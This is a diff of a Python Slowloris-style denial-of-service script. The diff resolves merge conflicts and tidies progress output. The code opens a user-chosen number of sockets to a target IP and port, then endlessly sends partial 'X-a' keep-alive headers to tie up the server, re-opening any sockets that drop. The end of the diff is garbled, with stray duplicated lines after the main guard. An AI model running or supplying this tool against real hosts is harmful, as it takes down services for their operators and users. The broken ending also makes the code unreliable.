@@ -25,17 +25,13 @@ def main():
     ip = sys.argv[1]
     port = sys.argv[2]
     socket_count= int(sys.argv[3])
-    bar = Bar('\033[1;32;40m Creating Sockets..', max=socket_count)
+    bar = Bar('Processing', max=socket_count)
     timer = int(sys.argv[4])
-    #print("Creating Sockets...")
+    print("Creating Sockets...")
     socket_list=[]
     for _ in range(int(socket_count)):
         try:
-<<<<<<< HEAD
-            #print("\t{}".format(_))
-=======
-            print("{}Creating Socket# {}".format("\t",_))
->>>>>>> aa967984703dc764d559b16a38f11cd080076319
+            print("{}Creating Socket# {}".format("\n",_))
             s=init_socket(ip,port)
         except socket.error:
             break
@@ -43,21 +39,25 @@ def main():
         bar.next()
     bar.finish()
     while True:
-        print("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list)))
+        print("Sending Keep-Alive Headers to {}".format(len(socket_list)))
         for s in socket_list:
             try:
                 s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
             except socket.error:
                 socket_list.remove(s)
         for _ in range(socket_count - len(socket_list)):
-<<<<<<< HEAD
-            print("\033[1;34;40m {}Re-creating Socket# {}".format("\n",_))
-=======
->>>>>>> aa967984703dc764d559b16a38f11cd080076319
+            print("{}Re-creating Socket...".format("\n"))
             try:
-                print("{}Re-Creating Socket# {}".format("\t",_))
-				s=init_socket(ip,port)
+                s=init_socket(ip,port)
                 if s:
+                    socket_list.append(s)
+                    bar.next()
+            except socket.error:
+                break
+        bar.finish()
+        time.sleep(timer)
+if __name__=="__main__":
+    main()
                     socket_list.append(s)
             except socket.error:
                 break
